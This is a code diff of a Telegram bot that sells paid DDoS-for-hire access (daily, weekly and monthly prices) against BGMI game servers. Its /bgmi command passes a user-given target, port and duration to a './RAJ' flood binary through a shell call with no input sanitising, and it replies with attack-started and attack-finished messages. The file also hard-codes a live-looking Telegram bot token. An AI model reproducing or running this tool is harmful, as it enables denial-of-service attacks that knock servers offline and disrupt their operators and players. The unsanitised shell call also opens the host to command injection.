@@ -5,9 +5,11 @@ import subprocess
 import datetime
 import os
 
-
+from keep_alive import keep_alive
+keep_alive()
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7946776175:AAHtvZjaxYYawhd5CR0lmPFTLsrBtrAhmf8')
+
 # Admin user IDs
 admin_id = {"6353114118"}
 
@@ -202,7 +204,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝:VIP USER OF:@SLAYER_OP7"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -215,43 +217,36 @@ COOLDOWN_TIME =0
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+        
         command = message.text.split()
-        if len(command) == 4:
+        if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
-            port = int(command[2])
-            time = int(command[3])
+            port = int(command[2])  # Convert time to integer
+            time = int(command[3])  # Convert port to integer
             if time > 181:
-                response = "🚨 **Error:** Time must be less than 181 seconds."
+                response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                
-                # Stylish attack start message
-                bot.reply_to(message, f"🔥 **ATTACK STARTED!** 🔥\n"
-                                      f"🎯 **Target:** `{target}`\n"
-                                      f"🚀 **Port:** `{port}`\n"
-                                      f"⏳ **Duration:** `{time} seconds`\n"
-                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7`\n", 
-                                      parse_mode="Markdown")
-
-               full_command = f"./RAJ {target} {port} {time} 900"
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./RAJ {target} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
-
-                # Stylish attack completion message
-                bot.reply_to(message, f"✅ **ATTACK FINISHED!** ✅\n"
-                                      f"🎯 **Target:** `{target}\n"
-                                      f"🚀 **Port:** `{port}`\n"
-                                      f"⏳ **Duration:** `{time} seconds\n"
-                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7\n"
-                                      f"💪 *Mission Accomplished!* 🎯\n", 
-                                      parse_mode="Markdown")
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅Usage:- /bgmi <target> <port> <time>"
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "🚫 PEHLE ACCESS LEKR AA JA AB @SLAYER_OP7."
-    
-    bot.reply_to(message, response)
+        response = " You Are Not Authorized To Use This Command ."
 
+    bot.reply_to(message, response)
 
 
 
@@ -330,7 +325,7 @@ Pr-ice List💸 :
 Day-->100 Rs
 Week-->400 Rs
 Month-->800 Rs
-contact -@SLAYER_OP7
+dm @SLAYER_OP7
 '''
     bot.reply_to(message, response)
 
